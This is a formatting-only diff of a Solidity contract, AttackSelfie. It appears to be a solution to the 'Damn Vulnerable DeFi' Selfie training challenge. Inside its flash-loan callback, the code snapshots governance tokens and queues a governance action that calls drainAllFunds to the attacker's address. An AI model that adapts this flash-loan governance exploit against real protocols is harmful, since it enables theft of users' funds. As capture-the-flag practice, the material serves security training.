@@ -9,11 +9,7 @@ contract AttackSelfie {
     DamnValuableTokenSnapshot public governanceToken;
     address owner;
 
-    constructor(
-        address poolAddress,
-        address governanceTokenAddress,
-        address _owner
-    ) {
+    constructor(address poolAddress, address governanceTokenAddress, address _owner) {
         pool = SelfiePool(poolAddress);
         governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
         owner = _owner;
@@ -26,11 +22,7 @@ contract AttackSelfie {
 
     function receiveTokens(address token, uint256 amount) external {
         governanceToken.snapshot();
-        pool.governance().queueAction(
-            address(pool),
-            abi.encodeWithSignature("drainAllFunds(address)", owner),
-            0
-        );
+        pool.governance().queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
         governanceToken.transfer(address(pool), amount);
     }
 }
